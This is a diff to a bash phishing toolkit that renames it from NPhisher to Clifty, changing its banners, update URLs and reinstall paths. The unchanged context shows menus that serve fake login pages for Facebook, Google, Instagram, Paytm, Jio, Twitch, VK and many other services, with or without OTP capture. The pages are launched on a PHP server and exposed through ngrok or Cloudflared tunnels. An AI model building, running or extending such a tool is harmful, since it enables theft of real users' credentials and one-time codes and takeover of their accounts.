@@ -126,46 +126,40 @@ date_minute=$(date +%M)
 date_second=$(date +%S)
 date_nanosec=$(date +%n)
 #prompt---
-selected="NPhisher"
+selected="Clifty"
 
 #Normal Banner
 banner(){
         echo -e " "
-        echo -e "${CYAN}----------------------------------------------------------------${NC} "
-	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
-	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
-	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
-	echo -e "${RED} ██╔██╗  ██║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
-	echo -e "${RED} ██║ ╚██╗██║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
-	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
-	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
-	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
-	echo -e "${CYAN}----------------------------------------------------------------${NC} "
+        echo -e "${MAGENTA}-----------------------------------------------------------------${NC} "
+	echo -e "${MAGENTA}|          ${BLUE} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}██║     ██║     ██║█████╗     ██║    ╚████╔╝         ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝          ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}╚██████╗███████╗██║██║        ██║      ██║           ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝           ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}-----------------------------------------------------------------${NC}"
 }
 # Credits banner
 cbanner(){
-	echo -e " "
-        echo -e "${CYAN}----------------------------------------------------------------${NC}"
-	echo -e "${RED} ██      ██╗${BLUE}██████╗${NC}"
-	echo -e "${RED} ███╗    ██║${BLUE}██╔══██║ ${NC}"
-	echo -e "${RED} ████╗   ██║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
-	echo -e "${RED} ██╔██╗  ██║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
-	echo -e "${RED} ██║ ╚██╗██║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
-	echo -e "${RED} ██║   ╚███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
-	echo -e "${RED} ██║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
-	echo -e "${RED} ╚═╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
-        echo -e "${CYAN}----------------------------------------------------------------${NC}"
-	echo -e "${CYAN}-------------${MAGENTA}Version 1.3${CYAN}---------------------${BLUE}By${NC}-${RED}Alygnt${CYAN}----------${NC}"
-	echo -e "${CYAN}----------------------------------------------------------------${NC} "
+        echo -e " "
+        echo -e "${MAGENTA}|---------------------------------------------------------------|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE} ██████╗██╗     ██╗███████╗████████╗██╗   ██╗        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}██╔════╝██║     ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝        ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}██║     ██║     ██║█████╗     ██║    ╚████╔╝         ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}██║     ██║     ██║██╔══╝     ██║     ╚██╔╝          ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE}╚██████╗███████╗██║██║        ██║      ██║           ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|          ${BLUE} ╚═════╝╚══════╝╚═╝╚═╝        ╚═╝      ╚═╝           ${MAGENTA}|${NC}"
+	echo -e "${MAGENTA}|---------------------------------------------------------------|${NC}"
+	echo -e "${BOLDBLUE}           ᴠᴇʀsɪᴏɴ 1.4               ＢＹ －ＡＬＹＧＮＴ           ${NC}"
 }
 #Small Banner
 sbanner(){
 	echo -e " "
-	echo -e "${RED} ▒█▄  ▒█${BLUE} ▒█▀▀█ ${NC}"
-	echo -e "${RED} ▒█▒█ ▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
-	echo -e "${RED} ▒█░ █▒█${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
-	echo -e "${RED} ▒█░  ██${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
-	echo -e "${CYAN}        ${NC} "
+	echo -e "${BLUE} ░█▀▀░█░░░▀█▀░█▀▀░▀█▀░█░█ ${NC}"
+	echo -e "${BLUE} ░█░░░█░░░░█░░█▀▀░░█░░░█░ ${NC}"
+	echo -e "${BLUE} ░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░░▀░ ${NC}"
+	echo -e "${NC} "
 }
 
 ## Update Prompt
@@ -267,10 +261,10 @@ kill_pid() {
 
 #check whether execute permission is granted
 xpermission(){
-	if [[ -x "nphisher.sh" ]];then
+	if [[ -x "clifty.sh" ]];then
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 	else
-	        chmod 777 nphisher.sh
+	        chmod 777 clifty.sh
 	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
 	fi
 }
@@ -291,7 +285,7 @@ check_update() {
 	rm -rf core/update/tmp
 	mkdir core/update/tmp
 
-	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/NPhisher/main/core/update/version.txt > /dev/null 2>&1
+	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/Clifty/main/core/update/version.txt > /dev/null 2>&1
 	mv version.txt core/update/tmp
 
 	current_ver=$( cat core/update/version.txt )
@@ -316,31 +310,31 @@ check_update() {
 
 update() {
 	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
-	mkdir $HOME/nphisher
+	mkdir $HOME/clifty
 	if [ -e .server/ngrok ]; then
-		mv .server/ngrok $HOME/nphisher
+		mv .server/ngrok $HOME/clifty
 	fi
 	if [ -e .server/cloudflared ]; then
-        	mv .server/cloudflared $HOME/nphisher
+        	mv .server/cloudflared $HOME/clifty
 	fi
 
 	cd ..
-	rm -rf NPhisher
+	rm -rf Clifty
 	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
-	git clone https://github.com/Alygnt/NPhisher
+	git clone https://github.com/Alygnt/Clifty
 
-	if [ -d NPhisher ]; then
-		cd NPhisher
-	        mv $HOME/nphisher/ngrok .server
-	        mv $HOME/nphisher/cloudflared .server
-	        rm -rf $HOME/nphisher
+	if [ -d Clifty ]; then
+		cd Clifty
+	        mv $HOME/clifty/ngrok .server
+	        mv $HOME/clifty/cloudflared .server
+	        rm -rf $HOME/clifty
 	        credits_banner
 		echo -e " "
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
 	        sleep 0.3
 		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
 	        sleep 2
-	        bash nphisher.sh
+	        bash clifty.sh
 		echo  " "
 	else
 		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
@@ -681,7 +675,7 @@ setup_site() {
         redirect_check
 	cusport
         echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-        cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+        cd ${www_dir} && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Redirect
@@ -1178,7 +1172,7 @@ echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Ngrok.io     ${RED}[${CYAN}Need to cr
 echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
 echo -e "${RED}[${WHITE}04${RED}]${YELLOW} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 echo -e "${NC}"
-selected="NPhisher/${siname}/${sitype}"
+selected="Clifty/${siname}/${sitype}"
 uprompt;read -p "${prompt}" tuchoice
         case $tuchoice in
                 1 | 01)
@@ -1376,7 +1370,7 @@ case $reply in
 	68)
 		site_pattern;;
 	A | a)
-		xdg-open https://github.com/Alygnt/NPhisher
+		xdg-open https://github.com/Alygnt/Clifty
 		{ sleep 2; clear;  banner; mainmenu; };;
 	B | b | C | c)
 		xdg-open https://github.com/RDXLR/Alygnt/issues/new
@@ -1408,7 +1402,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1447,7 +1441,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1478,7 +1472,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1509,7 +1503,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1540,7 +1534,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1571,7 +1565,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1612,7 +1606,7 @@ echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1651,7 +1645,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1689,7 +1683,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 -echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1725,7 +1719,7 @@ echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
 echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1776,7 +1770,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1816,7 +1810,7 @@ echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1857,7 +1851,7 @@ echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1896,7 +1890,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1931,7 +1925,7 @@ echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
 echo -e "${BLUE}[05]${CYAN} Google old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[06]${CYAN} Google old - WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -1978,7 +1972,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2026,7 +2020,7 @@ echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
 echo -e "${BLUE}[12]${CYAN} Instagram Video - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2105,7 +2099,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
 echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2136,7 +2130,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2167,7 +2161,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2200,7 +2194,7 @@ echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2239,7 +2233,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2278,7 +2272,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2309,7 +2303,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2356,7 +2350,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2389,7 +2383,7 @@ echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2445,7 +2439,7 @@ echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2473,7 +2467,7 @@ rdurl="proton.me/"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2520,7 +2514,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
 echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2551,7 +2545,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2582,7 +2576,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2613,7 +2607,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2644,7 +2638,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2675,7 +2669,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2706,7 +2700,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2762,7 +2756,7 @@ echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2791,7 +2785,7 @@ echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2826,7 +2820,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2857,7 +2851,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2888,7 +2882,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2928,7 +2922,7 @@ echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
 echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -2971,7 +2965,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -3002,7 +2996,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -3033,7 +3027,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -3064,7 +3058,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -3095,7 +3089,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -3127,7 +3121,7 @@ echo -e ""
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
@@ -3151,7 +3145,7 @@ rdurl="www.jio.com/business/jiofi"
 echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
 echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
 echo -e " ${NC}"
-selected="NPhisher/${siname}"
+selected="Clifty/${siname}"
 uprompt;read -p "${prompt}" sichoice
 
 case $sichoice in
